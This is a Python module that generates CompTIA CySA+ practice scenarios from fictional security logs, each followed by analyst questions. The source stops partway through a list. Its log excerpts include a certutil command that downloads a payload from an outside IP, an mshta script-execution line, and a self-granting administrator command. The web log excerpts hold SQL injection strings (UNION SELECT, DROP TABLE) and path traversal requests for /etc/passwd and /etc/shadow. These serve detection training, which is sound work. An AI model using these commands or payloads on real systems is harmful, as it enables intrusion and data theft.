"""
GIDEON CySA+ CS0-004 Log Analysis Module
==========================================
Realistic log-based PBQ scenarios for CySA+ CS0-004 exam preparation.
All log entries are entirely fictional and original.
Drop into pbq/ folder alongside cysa_plus_module.py

Log Types Covered:
  1. Windows Security Event Logs
  2. Network / Firewall Logs
  3. DNS Logs
  4. Authentication / IAM Logs
  5. IDS/IPS Logs
  6. Web Server / Application Logs

No LLM required - instant generation from randomised templates.
"""

import random

CYSA_LOG_EXAM = {
    "code":    "CS0-004",
    "name":    "CompTIA CySA+",
    "version": "V4",
    "module":  "Log Analysis",
}

WINDOWS_EVENT_SCENARIOS = [
    {
        "id": "LOG-WIN-001",
        "log_type": "Windows Security Event Log",
        "attack_type": "Brute Force Attack",
        "domain": "1",
        "objective": "1.3 - Identify indicators of malicious activity from log data",
        "difficulty": "intermediate",
        "scenario_template": """
You are a SOC analyst reviewing Windows Security Event Logs from Domain
Controller {dc_name} ({dc_ip}). The following log excerpt was flagged by
your SIEM at {alert_time} UTC:

----------------------------------------------------------------------
LOG EXCERPT - {dc_name} Windows Security Event Log
----------------------------------------------------------------------
{timestamp_1}  EventID 4625  Account: {username}  Source IP: {src_ip}
               Failure Reason: Unknown username or bad password
               Logon Type: 3 (Network)

{timestamp_2}  EventID 4625  Account: {username}  Source IP: {src_ip}
               Failure Reason: Unknown username or bad password
               Logon Type: 3 (Network)

{timestamp_3}  EventID 4625  Account: {username}  Source IP: {src_ip}
               Failure Reason: Unknown username or bad password
               Logon Type: 3 (Network)

{timestamp_4}  EventID 4625  Account: {username}  Source IP: {src_ip}
               Failure Reason: Unknown username or bad password
               Logon Type: 3 (Network)

{timestamp_5}  EventID 4625  Account: {username}  Source IP: {src_ip}
               Failure Reason: Unknown username or bad password
               Logon Type: 3 (Network)

{timestamp_6}  EventID 4624  Account: {username}  Source IP: {src_ip}
               Logon Type: 3 (Network)
               Authentication Package: NTLM
               Workstation: {workstation}

{timestamp_7}  EventID 4672  Account: {username}  Source IP: {src_ip}
               Special privileges assigned to new logon
               Privileges: SeDebugPrivilege, SeImpersonatePrivilege
----------------------------------------------------------------------

Questions:
1. Identify the attack technique shown in this log excerpt.
   What do EventIDs 4625, 4624, and 4672 each indicate?

2. The successful login used NTLM authentication (EventID 4624).
   Why is NTLM considered a security risk in modern environments
   and what should replace it?

3. EventID 4672 was generated immediately after the successful login.
   What does this tell you about the account {username} and why is
   this significant to your investigation?

4. Write a SIEM correlation rule in plain logic (not vendor-specific)
   that would alert on this exact pattern in future.

5. List your immediate response actions in order - what do you do
   in the first 10 minutes after confirming this is malicious?
""",
        "variables": {
            "dc_name":     ["DC01-CORP", "DC02-PROD", "AUTH-SRV01", "CORP-DC01"],
            "dc_ip":       ["10.10.1.10", "172.16.0.5", "10.0.1.20", "192.168.1.5"],
            "alert_time":  ["02:17", "03:44", "01:58", "04:22", "11:33"],
            "username":    ["svc_backup", "admin.jones", "corp\\administrator", "svc_sql"],
            "src_ip":      ["185.220.101.47", "103.75.190.22", "91.108.4.150", "45.33.32.156"],
            "workstation": ["WKSTN-UNKNOWN", "CORP-PC-047", "SRV-JUMP-01"],
            "timestamp_1": ["2026-06-07 02:11:04"],
            "timestamp_2": ["2026-06-07 02:11:09"],
            "timestamp_3": ["2026-06-07 02:11:14"],
            "timestamp_4": ["2026-06-07 02:11:19"],
            "timestamp_5": ["2026-06-07 02:11:24"],
            "timestamp_6": ["2026-06-07 02:11:31"],
            "timestamp_7": ["2026-06-07 02:11:32"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
    {
        "id": "LOG-WIN-002",
        "log_type": "Windows Security Event Log",
        "attack_type": "Privilege Escalation",
        "domain": "1",
        "objective": "1.3 - Privilege escalation indicators",
        "difficulty": "intermediate",
        "scenario_template": """
You are investigating a potential insider threat on host {hostname} ({host_ip}).
HR has flagged user {username} for unusual after-hours activity.
The following Windows Security Event Log entries were extracted:

----------------------------------------------------------------------
LOG EXCERPT - {hostname} Windows Security Event Log
----------------------------------------------------------------------
{ts_1}  EventID 4624  Account: {username}
        Logon Type: 2 (Interactive)  Source: Console

{ts_2}  EventID 4688  Account: {username}
        New Process: cmd.exe
        Parent Process: explorer.exe
        Command Line: cmd.exe /c whoami /all

{ts_3}  EventID 4688  Account: {username}
        New Process: net.exe
        Parent Process: cmd.exe
        Command Line: net localgroup administrators

{ts_4}  EventID 4688  Account: {username}
        New Process: net.exe
        Parent Process: cmd.exe
        Command Line: net localgroup administrators {username} /add

{ts_5}  EventID 4732  Account: {username}
        Member Added To Security-Enabled Local Group
        Group: Administrators

{ts_6}  EventID 4688  Account: {username}
        New Process: {suspicious_process}
        Parent Process: cmd.exe
        Command Line: {suspicious_cmdline}

{ts_7}  EventID 4634  Account: {username}
        Logoff Type: 2
----------------------------------------------------------------------

Questions:
1. EventID 4688 shows process creation with command line logging enabled.
   Why is command line logging critical for detecting this attack?

2. Map the sequence of events to the MITRE ATT&CK framework.
   Identify the specific technique for each suspicious EventID.

3. EventID 4732 confirms {username} added themselves to Administrators.
   What TWO Windows audit policies must be enabled to generate this event?

4. The final process {suspicious_process} was launched with command:
   {suspicious_cmdline}
   What is this process likely being used for?

5. Outline your evidence preservation steps before confronting HR.
""",
        "variables": {
            "hostname":   ["WKSTN-FIN-014", "LAPTOP-DEV-22", "PC-HR-007", "WKSTN-MGR-03"],
            "host_ip":    ["10.10.5.44", "172.16.20.10", "10.0.1.88", "192.168.10.55"],
            "username":   ["r.thompson", "d.chen", "m.patel", "s.wilson"],
            "ts_1": ["2026-06-06 08:47:12"], "ts_2": ["2026-06-06 17:52:04"],
            "ts_3": ["2026-06-06 17:52:09"], "ts_4": ["2026-06-06 17:52:14"],
            "ts_5": ["2026-06-06 17:52:15"], "ts_6": ["2026-06-06 17:52:44"],
            "ts_7": ["2026-06-06 17:58:01"],
            "suspicious_process": ["powershell.exe", "wscript.exe", "mshta.exe", "certutil.exe"],
            "suspicious_cmdline": [
                "powershell.exe -EncodedCommand ZQBjAGgAbwAgACIASABlAGwAbABvACIA",
                "certutil.exe -urlcache -split -f http://198.51.100.22/payload.exe",
                "mshta.exe vbscript:Execute(CreateObject(WScript.Shell).Run(cmd /c whoami))",
                "wscript.exe //E:jscript C:\\Users\\Public\\update.js",
            ],
        },
        "exam_objectives": ["1.2", "1.3", "3.2"],
    },
    {
        "id": "LOG-WIN-003",
        "log_type": "Windows Security Event Log",
        "attack_type": "Password Spray Attack",
        "domain": "1",
        "objective": "1.3 - Distinguish brute force from password spray",
        "difficulty": "advanced",
        "scenario_template": """
Your SIEM has triggered a high-priority alert at {alert_time} UTC.
You pull the following Windows Security Event Log data from
Domain Controller {dc_name}:

----------------------------------------------------------------------
LOG EXCERPT - {dc_name} - Account Lockout and Auth Failures
----------------------------------------------------------------------
{ts_1}  EventID 4625  Account: a.smith      Source IP: {src_ip}  Failure: Bad Password
{ts_1}  EventID 4625  Account: b.jones      Source IP: {src_ip}  Failure: Bad Password
{ts_1}  EventID 4625  Account: c.brown      Source IP: {src_ip}  Failure: Bad Password
{ts_1}  EventID 4625  Account: d.wilson     Source IP: {src_ip}  Failure: Bad Password
{ts_1}  EventID 4625  Account: e.taylor     Source IP: {src_ip}  Failure: Bad Password
{ts_1}  EventID 4625  Account: {username}   Source IP: {src_ip}  Failure: Bad Password
{ts_2}  EventID 4624  Account: {username}   Source IP: {src_ip}  Logon Type: 3  Auth: Kerberos
{ts_3}  EventID 4768  Account: {username}   Ticket: TGT  Result: 0x0 (Success)  Client: {src_ip}
{ts_4}  EventID 4776  Account: {username}   Workstation: {workstation}  Error: 0x0 (Success)
----------------------------------------------------------------------

Questions:
1. Identify the specific technique, explain how it differs from brute
   force, and explain why it is harder to detect.

2. Only {username} had a successful login. What does this suggest
   about the password {username} was using?

3. EventIDs 4768 and 4776 appear after the successful login.
   What does each event mean and what does the attacker now have?

4. Your lockout policy locks after 5 failed attempts. Why were NO
   accounts locked out and what policy change would help?

5. What FOUR log sources would you correlate immediately?
""",
        "variables": {
            "dc_name":    ["DC01-CORP", "CORP-DC02", "AUTH-DC01", "DOMAIN-DC01"],
            "alert_time": ["09:14", "14:32", "07:58", "16:44"],
            "src_ip":     ["185.220.101.47", "103.75.190.22", "91.108.4.150"],
            "username":   ["j.henderson", "p.morrison", "t.nakamura", "c.omalley"],
            "workstation":["CORP-PC-114", "WKSTN-022", "JUMP-SRV-01"],
            "ts_1": ["2026-06-07 09:08:44"], "ts_2": ["2026-06-07 09:08:51"],
            "ts_3": ["2026-06-07 09:08:52"], "ts_4": ["2026-06-07 09:08:52"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
]

FIREWALL_LOG_SCENARIOS = [
    {
        "id": "LOG-FW-001",
        "log_type": "Firewall / Network Log",
        "attack_type": "C2 Beaconing",
        "domain": "1",
        "objective": "1.3 - Network indicators, C2 traffic patterns",
        "difficulty": "intermediate",
        "scenario_template": """
You are reviewing perimeter firewall logs for your organisation.
Your threat intelligence platform flagged outbound traffic from
internal host {internal_host} to external IP {c2_ip}.

----------------------------------------------------------------------
LOG EXCERPT - Perimeter Firewall - Outbound Traffic
Columns: Timestamp | Action | Protocol | Src IP | Src Port | Dst IP | Dst Port | Bytes
----------------------------------------------------------------------
{ts_1}  ALLOW  TCP  {internal_host}  {src_port_1}  {c2_ip}  {c2_port}  284
{ts_2}  ALLOW  TCP  {internal_host}  {src_port_2}  {c2_ip}  {c2_port}  284
{ts_3}  ALLOW  TCP  {internal_host}  {src_port_3}  {c2_ip}  {c2_port}  284
{ts_4}  ALLOW  TCP  {internal_host}  {src_port_4}  {c2_ip}  {c2_port}  284
{ts_5}  ALLOW  TCP  {internal_host}  {src_port_5}  {c2_ip}  {c2_port}  284
{ts_6}  ALLOW  TCP  {internal_host}  {src_port_6}  {c2_ip}  {c2_port}  284
{ts_7}  ALLOW  TCP  {internal_host}  {src_port_7}  {c2_ip}  {c2_port}  9847334
----------------------------------------------------------------------
Total connections: 847 over {time_period} hours
Average interval: {beacon_interval} seconds
Byte size variation: less than 2 percent across first 846 connections

Questions:
1. Identify the network behaviour pattern shown in these logs.
   What specific characteristic is the strongest indicator of malicious activity?

2. The final connection transferred {final_mb}MB compared to 284 bytes previously.
   What phase of the attack does this most likely represent?

3. The traffic uses port {c2_port}. Why do attackers commonly use this port
   and how does it help evade detection?

4. Write a firewall rule to block this traffic. Then explain why a firewall
   block alone is insufficient as a response.

5. List THREE data sources to determine how long this host has been compromised.
""",
        "variables": {
            "internal_host": ["10.10.5.44", "172.16.20.33", "10.0.1.88"],
            "c2_ip":   ["198.51.100.22", "203.0.113.5", "192.0.2.88"],
            "c2_port": ["443", "80", "8080", "8443"],
            "src_port_1": ["49234"], "src_port_2": ["49891"], "src_port_3": ["50012"],
            "src_port_4": ["50344"], "src_port_5": ["50891"], "src_port_6": ["51203"],
            "src_port_7": ["51447"],
            "ts_1": ["2026-06-07 00:00:04"], "ts_2": ["2026-06-07 00:04:04"],
            "ts_3": ["2026-06-07 00:08:04"], "ts_4": ["2026-06-07 00:12:05"],
            "ts_5": ["2026-06-07 00:16:04"], "ts_6": ["2026-06-07 00:20:04"],
            "ts_7": ["2026-06-07 02:17:44"],
            "time_period": ["2", "4", "6", "8"],
            "beacon_interval": ["240", "300", "180", "420"],
            "final_mb": ["9.4", "14.2", "22.7", "4.8"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
    {
        "id": "LOG-FW-002",
        "log_type": "Firewall / Network Log",
        "attack_type": "Data Exfiltration",
        "domain": "1",
        "objective": "1.3 - Detect data exfiltration in network logs",
        "difficulty": "advanced",
        "scenario_template": """
A DLP alert has fired. You pull firewall logs for
server {server_name} ({server_ip}) which holds {data_type}.

----------------------------------------------------------------------
LOG EXCERPT - Perimeter Firewall - {server_name} Outbound
Columns: Timestamp | Action | Protocol | Src IP | Dst IP | Dst Port | Bytes | Country
----------------------------------------------------------------------
{ts_1}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443     1247  {country}
{ts_2}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443     2891  {country}
{ts_3}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443    47334  {country}
{ts_4}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443    98441  {country}
{ts_5}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443   214887  {country}
{ts_6}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443   887442  {country}
{ts_7}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443  2441908  {country}
{ts_8}  ALLOW  HTTPS  {server_ip}  {dst_ip_1}  443  8847221  {country}
{ts_9}  ALLOW  HTTPS  {server_ip}  {dst_ip_2}  443 14447334  {country}
{ts_10} ALLOW  HTTPS  {server_ip}  {dst_ip_2}  443 22114887  {country}
Total outbound: {total_gb}GB over {duration} minutes
Normal daily baseline: {baseline}MB
----------------------------------------------------------------------

Questions:
1. What pattern in the byte counts is a strong indicator of data staging?

2. All traffic uses HTTPS port 443 and was ALLOWED. Explain why encrypted
   exfiltration is challenging to detect and what controls can help.

3. Destinations are in {country} with no legitimate business connection.
   What firewall policy should have prevented this?

4. Total outbound is {total_gb}GB versus baseline {baseline}MB.
   What SIEM threshold rule would catch this?

5. Under {regulation}, what are your breach notification obligations?
""",
        "variables": {
            "server_name": ["FILE-SRV-01", "DB-PROD-02", "SHAREPOINT-SRV", "HR-DB-01"],
            "server_ip":   ["10.10.100.5", "172.16.50.10", "10.0.10.20"],
            "data_type":   ["customer PII including names emails and credit card data",
                           "employee HR records including salary and health information",
                           "intellectual property - product design documents"],
            "dst_ip_1": ["203.0.113.44", "198.51.100.88"],
            "dst_ip_2": ["203.0.113.45", "198.51.100.89"],
            "country":  ["Russia", "North Korea", "China", "Iran"],
            "ts_1":  ["2026-06-07 23:01:14"], "ts_2":  ["2026-06-07 23:01:44"],
            "ts_3":  ["2026-06-07 23:02:14"], "ts_4":  ["2026-06-07 23:03:01"],
            "ts_5":  ["2026-06-07 23:04:22"], "ts_6":  ["2026-06-07 23:06:11"],
            "ts_7":  ["2026-06-07 23:09:44"], "ts_8":  ["2026-06-07 23:14:02"],
            "ts_9":  ["2026-06-07 23:19:55"], "ts_10": ["2026-06-07 23:27:31"],
            "total_gb": ["4.7", "8.2", "12.4", "2.9"],
            "duration": ["26", "44", "18", "52"],
            "baseline": ["120", "85", "200", "150"],
            "regulation": ["GDPR", "NZ Privacy Act 2020", "HIPAA", "PCI DSS"],
        },
        "exam_objectives": ["1.3", "3.2", "4.2"],
    },
]

DNS_LOG_SCENARIOS = [
    {
        "id": "LOG-DNS-001",
        "log_type": "DNS Log",
        "attack_type": "DNS Tunneling",
        "domain": "1",
        "objective": "1.3 - DNS indicators, tunneling detection",
        "difficulty": "advanced",
        "scenario_template": """
Your DNS server logs have been ingested into your SIEM.
An anomaly detection rule fired on host {internal_host}.

----------------------------------------------------------------------
LOG EXCERPT - Internal DNS Server - Queries from {internal_host}
Columns: Timestamp | Client IP | Query Type | Query | Response | Bytes
----------------------------------------------------------------------
{ts_1}  {internal_host}  TXT  {encoded_1}.{c2_domain}  NOERROR  287
{ts_2}  {internal_host}  TXT  {encoded_2}.{c2_domain}  NOERROR  291
{ts_3}  {internal_host}  TXT  {encoded_3}.{c2_domain}  NOERROR  284
{ts_4}  {internal_host}  TXT  {encoded_4}.{c2_domain}  NOERROR  289
{ts_5}  {internal_host}  TXT  {encoded_5}.{c2_domain}  NOERROR  293
{ts_6}  {internal_host}  TXT  {encoded_6}.{c2_domain}  NOERROR  288
{ts_7}  {internal_host}  TXT  {encoded_7}.{c2_domain}  NOERROR  291
Total TXT queries to {c2_domain}: {total_queries} in {time_window} minutes
Average subdomain label length: {avg_label_length} characters
----------------------------------------------------------------------

Questions:
1. Identify the attack technique. Explain how it works and why DNS
   is used rather than direct TCP connections.

2. Identify THREE specific indicators that distinguish this traffic
   from legitimate DNS activity.

3. The subdomains contain strings like {encoded_1}. What encoding
   scheme is likely being used and what tool would you use to inspect?

4. What TWO DNS security controls would have blocked this earlier?

5. Explain why this bypasses most firewall rules and what architecture
   change would reduce the risk.
""",
        "variables": {
            "internal_host": ["10.10.5.44", "172.16.20.10", "10.0.1.88"],
            "c2_domain": ["updates-cdn.net", "telemetry-api.io", "cdn-delivery.com"],
            "time_window": ["15", "30", "45", "20"],
            "total_queries": ["847", "1203", "412", "2441"],
            "avg_label_length": ["42", "56", "38", "61"],
            "encoded_1": ["aGVsbG8td29ybGQ"], "encoded_2": ["dGhpcyBpcyBhIHRlc3Q"],
            "encoded_3": ["c2VjcmV0IGRhdGE"],  "encoded_4": ["ZXhhbXBsZSBwYXlsb2Fk"],
            "encoded_5": ["bWFsd2FyZSBiZWFjb24"], "encoded_6": ["Y29tbWFuZCBhbmQgY29udHJvbA"],
            "encoded_7": ["ZXhmaWx0cmF0aW9uIGRhdGE"],
            "ts_1": ["2026-06-07 14:00:04"], "ts_2": ["2026-06-07 14:00:06"],
            "ts_3": ["2026-06-07 14:00:08"], "ts_4": ["2026-06-07 14:00:10"],
            "ts_5": ["2026-06-07 14:00:12"], "ts_6": ["2026-06-07 14:00:14"],
            "ts_7": ["2026-06-07 14:00:16"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
    {
        "id": "LOG-DNS-002",
        "log_type": "DNS Log",
        "attack_type": "Typosquatting / Malicious Domain",
        "domain": "1",
        "objective": "1.3 - Malicious domain indicators",
        "difficulty": "intermediate",
        "scenario_template": """
Your threat intelligence feed flagged DNS queries from multiple
internal hosts to suspicious domains.

----------------------------------------------------------------------
LOG EXCERPT - Internal DNS Server - Flagged Queries
Columns: Timestamp | Client IP | Query | Response IP | TTL | Category
----------------------------------------------------------------------
{ts_1}  {host_1}  {typo_domain_1}  {malicious_ip_1}  60   UNCATEGORIZED
{ts_2}  {host_2}  {typo_domain_1}  {malicious_ip_1}  60   UNCATEGORIZED
{ts_3}  {host_1}  {typo_domain_2}  {malicious_ip_2}  300  UNCATEGORIZED
{ts_4}  {host_3}  {typo_domain_1}  {malicious_ip_1}  60   UNCATEGORIZED
{ts_5}  {host_1}  {typo_domain_3}  {malicious_ip_3}  60   UNCATEGORIZED
{ts_6}  {host_2}  {typo_domain_2}  {malicious_ip_2}  300  UNCATEGORIZED
{ts_7}  {host_4}  {typo_domain_1}  {malicious_ip_1}  60   UNCATEGORIZED
Legitimate domain: {legit_domain}
----------------------------------------------------------------------

Questions:
1. Compare {typo_domain_1} to {legit_domain}. What typosquatting
   technique was used and what is the likely purpose?

2. Four hosts queried these domains in a short window. What does this
   suggest about the initial infection vector?

3. TTL for {typo_domain_1} is only 60 seconds. Why do attackers use
   very low TTL values and what defensive technique does this evade?

4. None of these domains were categorised by your DNS filter.
   What is this gap called and what THREE controls would close it?

5. Write the steps to block these domains across your environment.
""",
        "variables": {
            "host_1": ["10.10.5.44"], "host_2": ["10.10.5.67"],
            "host_3": ["10.10.5.91"], "host_4": ["10.10.5.103"],
            "legit_domain":  ["microsoft.com", "office365.com", "google.com", "paypal.com"],
            "typo_domain_1": ["mlcrosoft.com", "0ffice365.com", "g00gle.com", "paypa1.com"],
            "typo_domain_2": ["micros0ft.com", "office-365.com", "googIe.com", "paypal-secure.com"],
            "typo_domain_3": ["microsoftt.com", "0ffice-365.com", "google-login.com", "paypall.com"],
            "malicious_ip_1": ["198.51.100.22", "203.0.113.5"],
            "malicious_ip_2": ["198.51.100.23", "203.0.113.6"],
            "malicious_ip_3": ["198.51.100.24", "203.0.113.7"],
            "ts_1": ["2026-06-07 10:14:22"], "ts_2": ["2026-06-07 10:14:31"],
            "ts_3": ["2026-06-07 10:14:44"], "ts_4": ["2026-06-07 10:15:02"],
            "ts_5": ["2026-06-07 10:15:11"], "ts_6": ["2026-06-07 10:15:28"],
            "ts_7": ["2026-06-07 10:15:44"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
]

AUTH_LOG_SCENARIOS = [
    {
        "id": "LOG-AUTH-001",
        "log_type": "Authentication / IAM Log",
        "attack_type": "Impossible Travel / Account Compromise",
        "domain": "1",
        "objective": "1.3 - Identity-based indicators",
        "difficulty": "intermediate",
        "scenario_template": """
Your Microsoft Entra ID Identity Protection has generated
a HIGH risk alert for user {user_email}. You pull the sign-in logs:

----------------------------------------------------------------------
LOG EXCERPT - Microsoft Entra ID Sign-in Logs - {user_email}
Columns: Timestamp | User | Location | IP | App | MFA | Risk | Result
----------------------------------------------------------------------
{ts_1}  {user_email}  {location_1}  {ip_1}
        App: Microsoft 365  MFA: Completed  Risk: None  Result: SUCCESS

{ts_2}  {user_email}  {location_2}  {ip_2}
        App: Microsoft 365  MFA: Completed  Risk: HIGH  Result: SUCCESS
        Risk Detail: Impossible travel - {travel_time} minutes since
        last login from {location_1} ({distance_km}km apart)

{ts_3}  {user_email}  {location_2}  {ip_2}
        App: SharePoint Online  MFA: Not Required (Trusted Location)
        Risk: HIGH  Result: SUCCESS

{ts_4}  {user_email}  {location_2}  {ip_2}
        App: Exchange Online  MFA: Not Required (Trusted Location)
        Risk: HIGH  Result: SUCCESS

{ts_5}  {user_email}  {location_2}  {ip_2}
        App: Azure Portal  MFA: Completed  Risk: HIGH  Result: SUCCESS
----------------------------------------------------------------------

Questions:
1. Define the impossible travel indicator. Calculate whether physical
   travel between {location_1} and {location_2} in {travel_time}
   minutes is possible and what this tells you about the account.

2. MFA was NOT required for ts_3 and ts_4 due to Trusted Location.
   How did the attacker likely bypass MFA and what does this tell
   you about your Conditional Access policy?

3. The attacker accessed Azure Portal (ts_5). Why is this particularly
   concerning compared to SharePoint or Exchange?

4. List your IMMEDIATE containment steps in order for the first 5 minutes.

5. What Conditional Access policy changes would prevent this attack vector?
""",
        "variables": {
            "user_email":  ["j.smith@contoso.com", "cfo@tailwind.com", "a.jones@fabrikam.com"],
            "location_1":  ["Auckland, New Zealand", "Sydney, Australia", "London, UK"],
            "location_2":  ["Moscow, Russia", "Beijing, China", "Lagos, Nigeria"],
            "ip_1": ["203.109.144.1", "101.182.44.22", "212.58.244.18"],
            "ip_2": ["185.220.101.47", "103.75.190.22", "91.108.4.150"],
            "travel_time":  ["14", "22", "8", "31"],
            "distance_km":  ["11247", "8941", "16340", "14112"],
            "ts_1": ["2026-06-07 08:14:22"], "ts_2": ["2026-06-07 08:28:44"],
            "ts_3": ["2026-06-07 08:29:01"], "ts_4": ["2026-06-07 08:29:14"],
            "ts_5": ["2026-06-07 08:31:55"],
        },
        "exam_objectives": ["1.3"],
    },
]

IDS_LOG_SCENARIOS = [
    {
        "id": "LOG-IDS-001",
        "log_type": "IDS/IPS Log",
        "attack_type": "Lateral Movement",
        "domain": "1",
        "objective": "1.3 - Lateral movement indicators in IDS logs",
        "difficulty": "advanced",
        "scenario_template": """
Your IDS has generated multiple alerts over a {time_window} minute
period originating from compromised host {patient_zero}.

----------------------------------------------------------------------
LOG EXCERPT - Snort IDS - Internal Segment Alerts
Columns: Timestamp | Priority | Alert | Src IP | Dst IP | Dst Port
----------------------------------------------------------------------
{ts_1}  P2  SMB Scan Detected
        Src: {patient_zero}  Dst: 10.10.0.0/24  Port: 445
        Signature: ET SCAN SMB sweep

{ts_2}  P1  EternalBlue Exploit Attempt
        Src: {patient_zero}  Dst: {target_1}  Port: 445
        Signature: ET EXPLOIT MS17-010 EternalBlue

{ts_3}  P1  Pass-the-Hash Attempt Detected
        Src: {patient_zero}  Dst: {target_2}  Port: 445
        Signature: ET LATERAL MOVEMENT Pass-the-Hash NTLM

{ts_4}  P2  PsExec Remote Execution
        Src: {patient_zero}  Dst: {target_2}  Port: 445
        Signature: ET TOOL PsExec Service Installation

{ts_5}  P1  Mimikatz Credential Dumping
        Src: {patient_zero}  Dst: {target_2}  Port: 0
        Signature: ET MALWARE Mimikatz Activity Detected

{ts_6}  P1  Pass-the-Hash Attempt Detected
        Src: {target_2}  Dst: {target_3}  Port: 445
        Signature: ET LATERAL MOVEMENT Pass-the-Hash NTLM

{ts_7}  P1  Pass-the-Hash Attempt Detected
        Src: {target_2}  Dst: {dc_ip}  Port: 445
        Signature: ET LATERAL MOVEMENT Pass-the-Hash NTLM
----------------------------------------------------------------------

Questions:
1. Map the full attack sequence to the MITRE ATT&CK framework.
   Identify the technique for each alert in order.

2. The attack progressed from {patient_zero} to {target_2} to {dc_ip}.
   What term describes this pattern and why is reaching {dc_ip} critical?

3. Mimikatz was detected on {target_2}. Explain what it does, what
   credential material it extracts, and why Pass-the-Hash followed.

4. Your IDS detected but did NOT block this traffic. What is the
   argument FOR and AGAINST switching to IPS prevention mode?

5. Design a network segmentation strategy that would have limited
   the blast radius of this lateral movement.
""",
        "variables": {
            "patient_zero": ["10.10.5.44", "172.16.20.10", "10.0.1.88"],
            "target_1":     ["10.10.5.67", "172.16.20.22", "10.0.1.102"],
            "target_2":     ["10.10.5.91", "172.16.20.44", "10.0.1.115"],
            "target_3":     ["10.10.5.103","172.16.20.55", "10.0.1.200"],
            "dc_ip":        ["10.10.1.10",  "172.16.0.5",  "10.0.1.5"],
            "time_window":  ["23", "41", "17", "55"],
            "ts_1": ["2026-06-07 15:02:11"], "ts_2": ["2026-06-07 15:03:44"],
            "ts_3": ["2026-06-07 15:07:22"], "ts_4": ["2026-06-07 15:07:55"],
            "ts_5": ["2026-06-07 15:09:01"], "ts_6": ["2026-06-07 15:11:33"],
            "ts_7": ["2026-06-07 15:14:07"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
]

WEB_LOG_SCENARIOS = [
    {
        "id": "LOG-WEB-001",
        "log_type": "Web Server / Application Log",
        "attack_type": "SQL Injection",
        "domain": "1",
        "objective": "1.3 - Web application attack indicators",
        "difficulty": "intermediate",
        "scenario_template": """
Your WAF has generated a critical alert for web application
{app_name} ({app_url}). You pull the access logs:

----------------------------------------------------------------------
LOG EXCERPT - Web Server Access Log - {app_name}
Columns: Timestamp | Src IP | Method | URI | Status | Bytes | User-Agent
----------------------------------------------------------------------
{ts_1}  {src_ip}  GET  /login.php?id=1  200  4821  {user_agent}
{ts_2}  {src_ip}  GET  /login.php?id=1'  500  1204  {user_agent}
{ts_3}  {src_ip}  GET  /login.php?id=1+OR+1%3D1--  200  48221  {user_agent}
{ts_4}  {src_ip}  GET  /login.php?id=1+UNION+SELECT+username,password,3+FROM+users--  200  12441  {user_agent}
{ts_5}  {src_ip}  GET  /login.php?id=1+UNION+SELECT+table_name,2,3+FROM+information_schema.tables--  200  28847  {user_agent}
{ts_6}  {src_ip}  GET  /login.php?id=1;+DROP+TABLE+users--  500  891  {user_agent}
{ts_7}  {src_ip}  GET  /admin/export.php?format=csv&table=customers  200  4447221  {user_agent}
----------------------------------------------------------------------

Questions:
1. Walk through what the attacker was attempting in each of the 7
   entries in sequence. What does the HTTP 500 in ts_2 tell the attacker?

2. ts_3 returned 200 with 48221 bytes vs 4821 bytes for ts_1.
   What does this difference confirm about the vulnerability?

3. Decode the URL-encoded characters in ts_3: %3D and +
   Write the decoded payload and explain what it instructs the database.

4. ts_7 shows a successful export of customers table (4.2MB).
   What are your breach notification obligations?

5. List FIVE controls that would have prevented this attack.
""",
        "variables": {
            "app_name": ["CustomerPortal", "StaffIntranet", "OnlineStore", "HRSystem"],
            "app_url":  ["portal.contoso.com", "intranet.fabrikam.com", "shop.tailwind.com"],
            "src_ip":   ["185.220.101.47", "103.75.190.22", "91.108.4.150"],
            "user_agent": [
                "sqlmap/1.7.8#stable (https://sqlmap.org)",
                "Mozilla/5.0 (compatible; custom-scanner/1.0)",
                "python-requests/2.31.0",
            ],
            "ts_1": ["2026-06-07 11:00:14"], "ts_2": ["2026-06-07 11:00:22"],
            "ts_3": ["2026-06-07 11:00:31"], "ts_4": ["2026-06-07 11:00:44"],
            "ts_5": ["2026-06-07 11:01:02"], "ts_6": ["2026-06-07 11:01:14"],
            "ts_7": ["2026-06-07 11:01:33"],
        },
        "exam_objectives": ["1.2", "1.3"],
    },
    {
        "id": "LOG-WEB-002",
        "log_type": "Web Server / Application Log",
        "attack_type": "Path Traversal",
        "domain": "1",
        "objective": "1.3 - Path traversal and web attack indicators",
        "difficulty": "intermediate",
        "scenario_template": """
Your SIEM flagged unusual HTTP requests against web server
{server_name} ({server_ip}). You pull the access logs:

----------------------------------------------------------------------
LOG EXCERPT - {server_name} IIS Access Log
Columns: Timestamp | Src IP | Method | URI | Status | Bytes
----------------------------------------------------------------------
{ts_1}  {src_ip}  GET  /download?file=report.pdf                        200  44821
{ts_2}  {src_ip}  GET  /download?file=../../../etc/passwd               200   2847
{ts_3}  {src_ip}  GET  /download?file=../../../etc/shadow               403    891
{ts_4}  {src_ip}  GET  /download?file=..%2F..%2F..%2Fetc%2Fpasswd      200   2847
{ts_5}  {src_ip}  GET  /download?file=..%2F..%2F..%2Fwindows%2Fwin.ini 200   1204
{ts_6}  {src_ip}  GET  /download?file=..%2F..%2F..%2F{sensitive_file}  200  {file_size}
{ts_7}  {src_ip}  GET  /download?file=..%2F..%2F..%2F{config_file}     200   8441
----------------------------------------------------------------------

Questions:
1. Identify the attack technique. Why does the attacker use both
   plain ../ and URL-encoded ..%2F versions of the same attack?

2. ts_3 returned 403 while ts_2 returned 200. What does this tell
   you about file access controls and what did the attacker learn?

3. ts_6 retrieved {sensitive_file} ({file_size} bytes). What data
   might this contain and what is the immediate risk?

4. ts_7 retrieved {config_file}. What sensitive information do
   config files often contain that enables further access?

5. List remediation steps covering input sanitisation, web server
   configuration, and file system permissions.
""",
        "variables": {
            "server_name": ["WEB-DMZ-01", "APP-SRV-02", "PORTAL-WEB-01"],
            "server_ip":   ["10.10.200.5", "172.16.100.10", "192.168.200.20"],
            "src_ip":      ["185.220.101.47", "103.75.190.22", "91.108.4.150"],
            "sensitive_file": [
